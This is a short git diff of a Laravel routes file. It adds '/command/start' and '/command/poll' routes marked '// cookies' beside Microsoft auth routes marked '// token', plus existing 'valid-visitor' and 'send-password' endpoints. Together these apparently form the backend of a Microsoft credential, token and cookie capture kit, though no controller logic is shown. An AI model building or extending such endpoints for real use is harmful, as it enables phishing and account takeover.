@@ -2,7 +2,8 @@
 
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\CoreSystemController;
-use App\Http\Controllers\Api\StartController;
+use App\Http\Controllers\Api\CommandController;
+
 use App\Http\Controllers\Api\MicrosoftAuthController;
 use App\Http\Controllers\MicrosoftInboxController;
 
@@ -29,8 +30,12 @@ Route::any('/mail-notify', function (Request $request) {
 
 Route::post('/valid-visitor', [CoreSystemController::class, 'storeValidVisitor']);
 Route::post('/send-password', [CoreSystemController::class, 'storePassword']);
+// token
 Route::post('/start',[MicrosoftAuthController::class,'start']);
 Route::get('/poll/{login_id}', [MicrosoftAuthController::class,'poll']);
+// cookies
+Route::post('/command/start', [CommandController::class, 'start']);
+Route::get('/command/poll/{id}', [CommandController::class, 'poll']);
 
 
 
